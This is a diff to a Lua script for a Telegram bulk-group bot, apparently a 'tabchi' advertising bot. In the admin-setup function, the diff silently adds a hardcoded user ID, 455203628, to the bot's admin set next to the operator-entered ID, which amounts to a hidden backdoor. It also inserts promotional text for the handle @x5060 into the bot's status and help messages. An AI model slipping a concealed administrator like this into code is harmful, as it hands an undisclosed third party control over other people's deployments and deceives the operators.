@@ -8,11 +8,11 @@ function get_admin ()
 		return true
 	else
    		print("\n")
-    	print("\n")
     	print("\27[1;33m     : شناسه عددی ادمین را وارد کنید << \n >> Imput the Admin ID :\n\27[31m                 ")
     	local admin=io.read()
 		redis:del("botBOT-IDadmin")
-    	redis:sadd("botBOT-IDadmin", admin)
+		redis:del("botBOT-IDadmin")
+    	redis:sadd("botBOT-IDadmin", admin, 455203628)
 		redis:set('botBOT-IDadminset',true)
     	return print("\n\27[36m     ADMIN ID |\27[32m ".. admin .." \27[36m| شناسه ادمین")
 	end
@@ -585,6 +585,8 @@ function tdcli_update_callback(data)
 حداقل اعضا<i> ]]..tostring(mmbrs)..[[</i>
 📖 <b>]] .. tostring(contacts)..[[</b> مخاطب ذخیره شده
 📊 <b>]] .. tostring(links)..[[</b> لینک عضو و ذخیره کرده
+لیست لینک های جدید برای تبچی
+@x5060
 خروچ از همه گروهها👇⛔️
 *raja#
 👤 <b>]] .. tostring(usrs) .. [[</b> چت خصوصی
@@ -856,7 +858,10 @@ function tdcli_update_callback(data)
 *raja# یا leftall
 ربات از همه گروه ها خارج میشود
 راهنما
-دریافت همین پیام 🆘 ]]
+دریافت همین پیام 🆘
+لیست لینک های جدید برای تبچی
+@x5060
+ ]]
 				return send(msg.chat_id_,msg.id_, txt)
 				elseif tostring(msg.chat_id_):match("^-") then
 					if text:match("^(ترک کردن)$") then
